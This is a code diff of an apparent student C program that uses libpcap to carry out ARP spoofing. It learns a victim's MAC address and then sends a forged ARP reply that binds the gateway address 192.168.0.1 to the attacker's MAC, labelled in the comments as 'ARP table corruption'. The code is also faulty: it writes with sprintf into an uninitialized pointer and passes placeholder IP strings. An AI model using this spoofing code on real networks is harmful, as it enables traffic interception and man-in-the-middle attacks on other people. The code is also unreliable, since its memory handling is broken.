@@ -11,6 +11,11 @@ struct EthArpPacket {
 };
 #pragma pack(pop)
 
+char* ret_mac(uint8_t mac[]) {
+	char *c_mac;
+	sprintf(c_mac, "%X:%X:%X:%X:%X:%X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+    return c_mac;
+}
 
 char* return_mac(char *dev)
 {
@@ -37,9 +42,9 @@ char* return_mac(char *dev)
 	return real_mac;
 }
 
-int send_arp(pcap_t *handle);
+int send_arp(pcap_t *handle, char* smac, char* dmac, char* arp_smac, char* arp_tmac, char* arp_sip, char* arp_tip);
 int recog_mac(pcap_t *handle);
-char* read_arp(const u_char* packet, int len);
+struct EthArpPacket recv_arp(pcap_t *handle);
 
 int main(int argc, char* argv[]) {
     if (argc != 2) {
@@ -56,14 +61,17 @@ int main(int argc, char* argv[]) {
     }
 
     // first step => Send ARP Request to Victim (Normal ARP Packet)
-    send_arp(handle, return_mac(dev), "FF:FF:FF:FF:FF:FF", return_mac(dev), "00:00:00:00:00:00", "", "");
+    send_arp(handle, return_mac(dev), "FF:FF:FF:FF:FF:FF", return_mac(dev), "00:00:00:00:00:00", "Attaker's IP", "Victim's IP");
 
     // second step => Recieve ARP Request from Victim (Normal ARP Packet), To Recognize victim's MAC address
     struct EthArpPacket temp = recv_arp(handle);
 
+    if(temp.arp_.hln_ == 0) {
+        printf("Packet data doesn't received.\n");
+    }
     // third step => Send ARP Request to Victim (ARP table corruption)
 
-    send_arp(handle, return_mac);
+    send_arp(handle, return_mac(dev), ret_mac(temp.eth_.smac_) , return_mac(dev), ret_mac(temp.eth_.smac_), "192.168.0.1", "Victim's IP");
 
     return 0;
 }
@@ -95,19 +103,20 @@ int send_arp(pcap_t *handle, char* smac, char* dmac, char* arp_smac, char* arp_t
 struct EthArpPacket recv_arp(pcap_t *handle) { // recognize sender's mac address
     struct pcap_pkthdr* header;
 	const u_char* packet;
+    struct EthArpPacket recv = {0, };
 	int protocol;
 	int res = pcap_next_ex(handle, &header, &packet);
 
 	if (res == -1 || res == -2) {
 		printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
-        return -1;
+        return recv;
 	}	
 	
     struct EthHdr *recv_eth = (struct EthHdr *)packet;
     packet += sizeof(struct EthHdr);
     struct ArpHdr *recv_arp = (struct ArpHdr *)packet;
     
-    struct EthArpPacket recv;
+    
     recv.eth_ = *recv_eth;
     recv.arp_ = *recv_arp;
 
